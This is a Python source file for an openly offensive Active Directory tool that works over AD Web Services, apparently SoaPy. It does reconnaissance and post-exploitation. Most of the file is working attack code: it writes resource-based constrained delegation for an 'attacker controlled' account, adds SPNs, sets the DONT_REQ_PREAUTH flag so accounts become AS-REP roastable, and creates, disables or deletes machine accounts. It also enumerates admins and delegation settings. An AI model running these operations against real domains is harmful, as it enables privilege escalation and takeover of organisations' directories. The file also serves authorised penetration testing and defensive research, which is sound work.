#!/usr/bin/env python3
import argparse
import logging
import sys
from base64 import b64decode, b64encode
import base64
import string
import random
from uuid import uuid4

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE,
    ACCESS_MASK,
    ACE,
    ACL,
    LDAP_SID,
    SR_SECURITY_DESCRIPTOR,
)

from src.adws import ADWSConnect, NTLMAuth
from src.soap_templates import NAMESPACES, LDAP_CREATE_FOR_RESOURCEFACTORY,LDAP_CREATE_FOR_RESOURCEFACTORY, LDAP_DELETE_FOR_RESOURCE



# https://github.com/fortra/impacket/blob/829239e334fee62ace0988a0cb5284233d8ec3c4/examples/rbcd.py#L180
def _create_empty_sd():
    sd = SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = LDAP_SID()
    # BUILTIN\Administrators
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd


# https://github.com/fortra/impacket/blob/829239e334fee62ace0988a0cb5284233d8ec3c4/examples/rbcd.py#L200
def _create_allow_ace(sid: LDAP_SID):
    nace = ACE()
    nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
    nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551  # Full control
    acedata["Sid"] = sid.getData()
    nace["Ace"] = acedata
    return nace

def getAccountDN(target: str, username: str, ip: str, domain: str, auth: NTLMAuth):
    """Get the distinguishedName of a user or computer in AD"""
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = ["distinguishedname"]

    pull_et = pull_client.pull(query=get_account_query, basedn=None, attributes=attributes)

    distinguishedName_elem = None

    # Cherche d'abord un user, sinon un computer
    for tag in [".//addata:user", ".//addata:computer"]:
        for item in pull_et.findall(tag, namespaces=NAMESPACES):
            distinguishedName_elem = item.find(
                ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
            )
            if distinguishedName_elem is not None:
                break
        if distinguishedName_elem is not None:
            break

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        raise RuntimeError(f"Unable to locate DN for target '{target}'")

    return distinguishedName_elem.text


def delete_computer(
    machine_name: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth
):
    """
    Delete an AD computer object using ADWS WS-Transfer Delete
    (same behavior as PowerShell Remove-ADComputer).
    """

    print(f"[*] Attempting to delete computer: {machine_name}")

    # Normalize SAM
    sam = machine_name if machine_name.endswith("$") else machine_name + "$"

    # ---- Locate DN of the computer ----
    print("[*] Locating computer in AD...")
    try:
        dn = getAccountDN(
            target=sam,
            username=username,
            ip=ip,
            domain=domain,
            auth=auth
        )
    except Exception as e:
        print(f"[-] Failed to locate machine {sam}: {e}")
        return False

    if not dn:
        print(f"[-] Could not find DN for computer {sam}")
        return False

    print(f"[+] Found DN: {dn}")

    # ---- Build WS-Transfer Delete request ----
    msg_id = f"urn:uuid:{uuid4()}"

    delete_payload = LDAP_DELETE_FOR_RESOURCE.format(
    object_dn=dn,
    fqdn=ip,
    uuid=msg_id
)

    # ---- Send request ----
    print("[*] Connecting to ADWS Resource endpoint to delete object...")

    client = ADWSConnect(ip, domain, username, auth, "Resource")
    client._nmf.send(delete_payload)
    response = client._nmf.recv()

    et = client._handle_str_to_xml(response)
    if et is None:
        print("[-] Empty or malformed DeleteResponse (but AD may still have removed the object).")
        return False

    print(f"[+] Computer {sam} successfully deleted.")
    return True




def encode_unicode_pwd(password: str) -> str:
    # AD requires: password in quotes, UTF-16LE encoded, base64 encoded
    quoted = f'"{password}"'
    pwd_utf16 = quoted.encode('utf-16-le')
    return base64.b64encode(pwd_utf16).decode()


def add_computer(
    target: str,
    machine_name: str,
    ou_dn: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
    computer_pass: str = None,
    spn_list: list = None,
) -> bool:
    """
    Create a computer object in AD via ADWS ResourceFactory (WS-Transfer Create)
    and optionally set unicodePwd and SPNs via Put operations.
    """

    if remove:
        raise NotImplementedError("Removal logic is not implemented.")
    
    # If no machine_name given by user, generate a secure name
    import secrets
    import string

    if machine_name is None:
        machine_name = 'DESKTOP-' + (''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8)))

    print(f"[+] Using machine ame: {machine_name}")


    # Normalize names
    sam = machine_name if machine_name.endswith("$") else machine_name + "$"
    cn = machine_name
    host = cn.rstrip("$")

    # Find DN container
    if ou_dn:
        container_dn = ou_dn
    else:
        domain_parts = [f"DC={p}" for p in domain.split(".") if p]
        domain_dn = ",".join(domain_parts)
        container_dn = f"CN=Computers,{domain_dn}"

    logging.info(f"[+] Creating computer account {sam} in {container_dn} via ADWS ResourceFactory")

    # ---- Build AttributeTypeAndValue XML blocks ----
    # If no password given by user, generate a secure 16-character password
    import secrets
    import string

    if computer_pass is None:
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*?"
        computer_pass = ''.join(secrets.choice(alphabet) for _ in range(16))

    print(f"[+] Using computer password: {computer_pass}")

    encoded_pass = encode_unicode_pwd(computer_pass)

    # Default SPNs like Powermad / Impacket
    default_spns = [
        f"HOST/{host}",
        f"HOST/{host}.{domain}",
        f"RestrictedKrbHost/{host}",
        f"RestrictedKrbHost/{host}.{domain}",
    ]

    spns = spn_list if spn_list else default_spns

    attrs = {
        "addata:objectClass": ["computer"],
        "ad:container-hierarchy-parent": [container_dn],
        "ad:relativeDistinguishedName": [f"CN={cn}"],
        "addata:sAMAccountName": [sam],
        "addata:userAccountControl": ["4096"],  # WORKSTATION_TRUST_ACCOUNT (0x1000)
        "addata:dnsHostName": [f"{host}.{domain}"],
        "addata:servicePrincipalName": spns,
        "addata:unicodePwd": [encoded_pass],
    }

    atav_xml = ""
    for attr_type, values in attrs.items():
        values_xml = ""
        for v in values:
            if attr_type == "addata:unicodePwd":
                # unicodePwd must be sent as base64Binary in ADWS SOAP
                values_xml += f'<ad:value xsi:type="xsd:base64Binary">{v}</ad:value>'
            else:
                # SPNs and dnsHostName are strings; multiple SPNs create multiple <ad:value> entries
                values_xml += f'<ad:value xsi:type="xsd:string">{v}</ad:value>'

        atav_xml += (
            "      <AttributeTypeAndValue>\n"
            f"        <AttributeType>{attr_type}</AttributeType>\n"
            f"        <AttributeValue>\n          {values_xml}\n        </AttributeValue>\n"
            "      </AttributeTypeAndValue>\n"
        )

    # ---- Build SOAP Envelope ----
    msg_id = f"urn:uuid:{uuid4()}"

    addrequest_payload = LDAP_CREATE_FOR_RESOURCEFACTORY.format(
        uuid=msg_id,
        fqdn=ip,
        atav_xml=atav_xml
    )

    # ---- Send AddRequest ----
    client = ADWSConnect(ip, domain, username, auth, "ResourceFactory")
    client._nmf.send(addrequest_payload)
    response = client._nmf.recv()

    et = client._handle_str_to_xml(response)
    if et is None:
        raise RuntimeError("AddRequest response empty or malformed.")

    logging.info("[+] AddRequest successful. Locating newly created object...")

    dn = getAccountDN(target=sam, username=username, ip=ip, domain=domain, auth=auth)
    if not dn:
        raise RuntimeError("Failed to locate DN of the newly created computer.")

    logging.info(f"[+] Created object DN: {dn}")

    print(f"[+] Computer {sam} successfully created in {dn}")
    return True







def set_spn(
    target: str,
    value: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Set a value in servicePrincipalName. Appends value to the 
    attribute rather than replacing.

    Args:
        target (str): target samAccountName
        value (str): value to append to the targets servicePrincipalName
        username (str) : user to authenticate as
        ip (str): the ip of the domain controller
        auth (NTLMAuth): authentication method
        remove (bool): Whether to remove the value
    """

    dn = getAccountDN(target=target,username=username,ip=ip,domain=domain,auth=auth)
                                  
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    
    put_client.put(
        object_ref=dn,
        operation="add" if not remove else "delete",
        attribute="addata:servicePrincipalName",
        data_type="string",
        value=value,
    )
        
    print(
        f"[+] servicePrincipalName {value} {'removed' if remove else 'written'} successfully on {target}!"
    )

def set_asrep(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Set the DONT_REQ_PREAUTH (0x400000) flag on the target accounts
    userAccountControl attribute. 

    Args:
        target (str): target samAccountName
        username (str): user to authenticate as
        ip (str): the ip of the domain controller
        remove (bool): Whether to remove the value
    """
    
    """First get current userAccountControl value"""
    get_accounts_queries = f"(sAMAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "userAccountControl",
        "distinguishedName",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    for item in pull_et.findall(".//addata:user", namespaces=NAMESPACES):
        uac = item.find(
            ".//addata:userAccountControl/ad:value",
            namespaces=NAMESPACES,   
        )
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )
    
    dn = distinguishedName_elem.text
    
    """Then write"""
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    if not remove:
        newUac = int(uac.text) | 0x400000

        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=newUac,
        )

    else:
        newUac = int(uac.text) & ~0x400000
        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=newUac,
        )
    
    print(
        f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!"
    )

def set_rbcd(
    target: str,
    account: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Write RBCD. Safe, appends to the attribute rather than
    replacing. Pass the remove param to remove the account sid from the
    target security descriptor

    Args:
        target (str): target samAccountName
        account (str): attacker controlled samAccountName
        username (str): user to authenticate as
        ip (str): the ip of the domain controller
        domain (str): specified account domain
        auth (NTLMAuth): authentication method
        remove (bool): Whether to remove the value
    """

    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"

    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    """Build attrs for RBCD computer pull"""
    attributes: list = [
        "samaccountname",
        "objectsid",
        "distinguishedname",
        "msds-allowedtoactonbehalfofotheridentity",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)

    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn: str = ""
    account_sid: LDAP_SID | None = None

    for item in pull_et.findall(".//addata:computer", namespaces=NAMESPACES):
        sam_name_elem = item.find(
            ".//addata:sAMAccountName/ad:value", namespaces=NAMESPACES
        )
        sd_elem = item.find(
            ".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value",
            namespaces=NAMESPACES,
        )
        sid_elem = item.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )

        sam_name = sam_name_elem.text if sam_name_elem != None else ""
        sid = sid_elem.text if sid_elem != None else ""
        sd = sd_elem.text if sd_elem != None else ""
        dn = distinguishedName_elem.text if distinguishedName_elem != None else ""

        if sam_name and sid and sam_name.casefold() == account.casefold():
            account_sid = LDAP_SID(data=b64decode(sid))
        if dn and sam_name and sam_name.casefold() == target.casefold():
            target_dn = dn
            if sd:
                target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd))

    if not account_sid:
        logging.critical(
            f"Unable to find {target} or {account}."
        )
        raise SystemExit()

    # collect a clean list.  remove the account sid if its present
    target_sd["Dacl"].aces = [
        ace
        for ace in target_sd["Dacl"].aces
        if ace["Ace"]["Sid"].formatCanonical() != account_sid.formatCanonical()
    ]
    if not remove:
        target_sd["Dacl"].aces.append(_create_allow_ace(account_sid))

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    put_client.put(
        object_ref=target_dn,
        operation="replace",
        attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
        data_type="base64Binary",
        value=b64encode(target_sd.getData()).decode("utf-8"),
    )

    # if we are removing and the list of aces is empty, just delete the attribute
    if remove and len(target_sd["Dacl"].aces) == 0:
        put_client.put(
            object_ref=target_dn,
            operation="delete",
            attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
            data_type="base64Binary",
            value=b64encode(target_sd.getData()).decode("utf-8"),
        )

    print(
        f"[+] msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} successfully!"
    )
    print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")


def disable_machine_account(
    machine_name: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth
) -> bool:
    """
    Disable a computer account (set the ACCOUNTDISABLE flag in userAccountControl)
    using ADWS WS-Transfer Put (replace userAccountControl).
    Behavior mirrors Powermad's Disable-MachineAccount: the creator of the account
    typically has write permissions to modify attributes like AccountDisabled/userAccountControl.
    """
    print(f"[*] Attempting to disable computer: {machine_name}")

    # Normalize SAM
    sam = machine_name if machine_name.endswith("$") else machine_name + "$"

    # ---- Locate current userAccountControl and DN ----
    get_accounts_queries = f"(sAMAccountName={sam})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "userAccountControl",
        "distinguishedName",
    ]

    try:
        pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    except Exception as e:
        print(f"[-] Failed LDAP pull for {sam}: {e}")
        return False

    uac_elem = None
    distinguishedName_elem = None

    # Try computer first, then user
    for tag in [".//addata:computer", ".//addata:user"]:
        for item in pull_et.findall(tag, namespaces=NAMESPACES):
            if uac_elem is None:
                uac_elem = item.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
            if distinguishedName_elem is None:
                distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
            if uac_elem is not None and distinguishedName_elem is not None:
                break
        if uac_elem is not None and distinguishedName_elem is not None:
            break

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        print(f"[-] Unable to locate DN for {sam}")
        return False

    dn = distinguishedName_elem.text

    if uac_elem is None or uac_elem.text is None:
        print(f"[-] Unable to locate userAccountControl for {sam}")
        return False

    try:
        current_uac = int(uac_elem.text)
    except Exception as e:
        print(f"[-] Failed to parse userAccountControl value: {e}")
        return False

    ACCOUNTDISABLE_FLAG = 0x2

    if (current_uac & ACCOUNTDISABLE_FLAG) != 0:
        print(f"[-] Computer {sam} is already disabled (userAccountControl={current_uac}).")
        return True

    new_uac = current_uac | ACCOUNTDISABLE_FLAG

    # ---- Perform Put (replace userAccountControl) ----
    try:
        put_client = ADWSConnect.put_client(ip, domain, username, auth)
        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=new_uac,
        )
    except Exception as e:
        print(f"[-] Failed to write new userAccountControl for {sam}: {e}")
        return False

    print(f"[+] Computer {sam} successfully disabled (userAccountControl set to {new_uac}).")
    return True


def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝ 
╚════██║██║   ██║██╔╔██║██╔═══╝   ╚██╔╝  
███████║╚██████╔╝██║  ██║██║        ██║   
╚══════╝ ╚═════╝ ╚═╝  ██╔╝╚═╝        ╚═╝   

@_logangoins
github.com/jlevere  
          """)

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Perform AD reconnaisance and post-exploitation through ADWS from Linux ",
    )
    parser.add_argument(
        "connection",
        action="store",
        help="domain/username[:password]@<targetName or address>",
    )
    parser.add_argument(
        "--debug", 
        action="store_true", 
        help="Turn DEBUG output ON"
    )
    parser.add_argument(
        "--ts", 
        action="store_true", 
        help="Adds timestamp to every logging output."
    )
    parser.add_argument(
        "-H", "--hash",
        action="store",
        metavar="nthash",
        help="Use an NT hash for authentication",
    )

    enum = parser.add_argument_group('Enumeration')
    enum.add_argument(
        "--users",
        action="store_true", 
        help="Enumerate user objects"
    )
    enum.add_argument(
        "--computers",
        action="store_true",
        help="Enumerate computer objects"
    )
    enum.add_argument(
        "--groups", 
        action="store_true",
        help="Enumerate group objects"
    )
    enum.add_argument(
        "--constrained",
        action="store_true",
        help="Enumerate objects with the msDS-AllowedToDelegateTo attribute set",
    )
    enum.add_argument(
        "--unconstrained",
        action="store_true",
        help="Enumerate objects with the TRUSTED_FOR_DELEGATION flag set",
    )
    enum.add_argument(
        "--spns", 
        action="store_true", 
        help="Enumerate accounts with the servicePrincipalName attribute set"
    )
    enum.add_argument(
        "--asreproastable", 
        action="store_true", 
        help="Enumerate accounts with the DONT_REQ_PREAUTH flag set"
    )
    enum.add_argument(
        "--admins", 
        action="store_true",
        help="Enumerate high privilege accounts"
    )
    enum.add_argument(
        "--rbcds", 
        action="store_true",
        help="Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set"
    )
    enum.add_argument(
        "-q",
        "--query",
        action="store",
        metavar="query",
        help="Raw query to execute on the target",
    )
    enum.add_argument(
        "-f", "--filter",
        action="store",
        metavar="attr,attr,...",
        help="Attributes to select from the objects returned, in a comma seperated list",
    )
    enum.add_argument(
        "-dn", "--distinguishedname",
        action="store",
        metavar="distinguishedname",
        help="The root objects distinguishedName for the query",
    )
    enum.add_argument(
        "-p", "--parse",
        action="store_true",
        help="Parse attributes to human readable format",
    )

    writing = parser.add_argument_group('Writing')
    writing.add_argument(
        "--rbcd",
        action="store",
        metavar="source",
        help="Operation to write or remove RBCD. Also used to pass in the source computer account used for the attack.",
    )
    writing.add_argument(
        "--spn",
        action="store",
        metavar="value",
        help='Operation to write the servicePrincipalName attribute value, writes by default unless "--remove" is specified',
    )
    writing.add_argument(
        "--asrep",
        action="store_true",
        help="Operation to write the DONT_REQ_PREAUTH (0x400000) userAccountControl flag on a target object"
    )
    writing.add_argument(
        "--account",
        action="store",
        metavar="account",
        help="Account to preform an operation on",
    )
    writing.add_argument(
        "--remove",
        action="store_true",
        help="Operarion to remove an attribute value based off an operation",
    )

    # -- ADD COMPUTER options
    # Make --addcomputer accept an optional MACHINE argument.
    # If the user provides the flag without a value, argparse will set it to ''
    # and we will treat that as "generate a machine name".
    writing.add_argument(
        "--addcomputer",
        nargs='?',
        const='',
        action="store",
        metavar="MACHINE",
        help="Create a new computer account in AD (machine name). If omitted, a random name will be generated.",
    )
    writing.add_argument(
        "--computer-pass",
        action="store",
        metavar="pass",
        help="Password for the new computer account (optional).",
    )
    writing.add_argument(
        "--ou",
        action="store",
        metavar="ou",
        help="DN of the OU where to create the computer (optional).",
    )

    writing.add_argument(
    "--delete-computer",
    action="store",
    metavar="MACHINE",
    help="Delete an existing computer account from Active Directory (requires admin privileges!)",
)

    # -- DISABLE COMPUTER option (equivalent to Powermad's Disable-MachineAccount)
    writing.add_argument(
        "--disable-account",
        action="store",
        metavar="MACHINE",
        help="Disable a computer account (set AccountDisabled) in Active Directory",
    )


    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.connection)

    if domain is None:
        domain = ""

    # if there are no supplied auth information, ask for a password interactivly
    if password == "" and username != "" and options.hash is None:
        from getpass import getpass

        password = getpass("Password:")

    queries: dict[str, str] = {
        "users": "(&(objectClass=user)(objectCategory=person))",
        "computers": "(objectClass=computer)",
        "constrained": "(msds-allowedtodelegateto=*)",
        "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        "spns": "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "asreproastable":"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "admins": "(&(objectClass=user)(adminCount=1))",
        "groups": "(objectCategory=group)",
        "rbcds": "(msds-allowedtoactonbehalfofotheridentity=*)",
    }

    """Just check if anything is specified"""
    ldap_query = []
    ldap_query.append(options.query)
    for flag, this_query in queries.items():
            if getattr(options, flag):
                ldap_query.append(this_query)

    if not domain:
        logging.critical('"domain" must be specified')
        raise SystemExit()

    if not username:
        logging.critical('"username" must be specified')
        raise SystemExit()

    auth = NTLMAuth(password=password, hashes=options.hash)
    
    if options.rbcd != None:
        if not options.account:
            logging.critical(
                '"--rbcd" must be used with "--account"'
            )
            raise SystemExit()

        set_rbcd(
            ip=remoteName,
            domain=domain,
            target=options.account,
            account=options.rbcd,
            username=username,
            auth=auth,
            remove=options.remove,
        )
    elif options.spn != None:
        if not options.account:
            logging.critical(
                'Please specify an account with "--account"'
            )
            raise SystemExit()
        
        set_spn(
            ip=remoteName,
            domain=domain,
            target=options.account,
            value=options.spn,
            username=username,
            auth=auth,
            remove=options.remove
        )
    elif options.asrep:
        if not options.account:
            logging.critical(
                'Please specify an account with "--account"'
            )
            raise SystemExit()
        
        set_asrep(
            ip=remoteName,
            domain=domain,
            target=options.account,
            username=username,
            auth=auth,
            remove=options.remove
        )
    elif getattr(options, "addcomputer", None) is not None:
        # options.addcomputer is set when the flag is present.
        # If the user passed the flag without a name, argparse sets it to '',
        # in which case we want add_computer to generate a name (pass machine_name=None).
        if not username:
            logging.critical('Please specify a username with the connection string')
            raise SystemExit()

        machine_name = None if options.addcomputer == "" else options.addcomputer

        try:
            add_computer(
            target=options.account if options.account else None,
            machine_name=machine_name,
            ou_dn=options.ou,
            username=username,
            ip=remoteName,
            domain=domain,
            auth=auth,
            remove=options.remove,
            computer_pass=options.computer_pass,   # <-- IMPORTANT
        )

            display_name = machine_name if machine_name else "(generated)"
            print(f"[+] Computer {display_name} {'removed' if options.remove else 'created'} successfully (requested).")
        except NotImplementedError as e:
            logging.error("Feature not implemented: %s", e)
            raise SystemExit(2)
        except Exception as e:
            logging.exception("Error during add_computer operation: %s", e)
            raise SystemExit(1)
    
    elif options.disable_account:
        if not username:
            logging.critical('Please specify a username with the connection string')
            raise SystemExit()
        try:
            success = disable_machine_account(
                machine_name=options.disable_account,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
            )
            if not success:
                raise SystemExit(1)
            print(f"[+] Computer {options.disable_account} disabled successfully (requested).")
        except Exception as e:
            logging.exception("Error during disable_account operation: %s", e)
            raise SystemExit(1)

    elif options.delete_computer:
        delete_computer(
            machine_name=options.delete_computer,
            username=username,
            ip=remoteName,
            domain=domain,
            auth=auth,
        )
        return

    else:
        if not ldap_query:
            logging.critical("Query can not be None")
            raise SystemExit()
       
        client = ADWSConnect.pull_client(
            ip=remoteName,
            domain=domain,
            username=username,
            auth=auth,
        )

        for current_query in ldap_query:

            if not current_query:
                continue
            """
            client = ADWSConnect.pull_client(
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )
            """

            if options.filter is not None:
                attributes: list = [x.strip() for x in options.filter.split(",")]
            else:
                attributes = None
            
            client.pull(current_query, options.distinguishedname, attributes, print_incrementally=True, parse_values=options.parse)


if __name__ == "__main__":
    run_cli()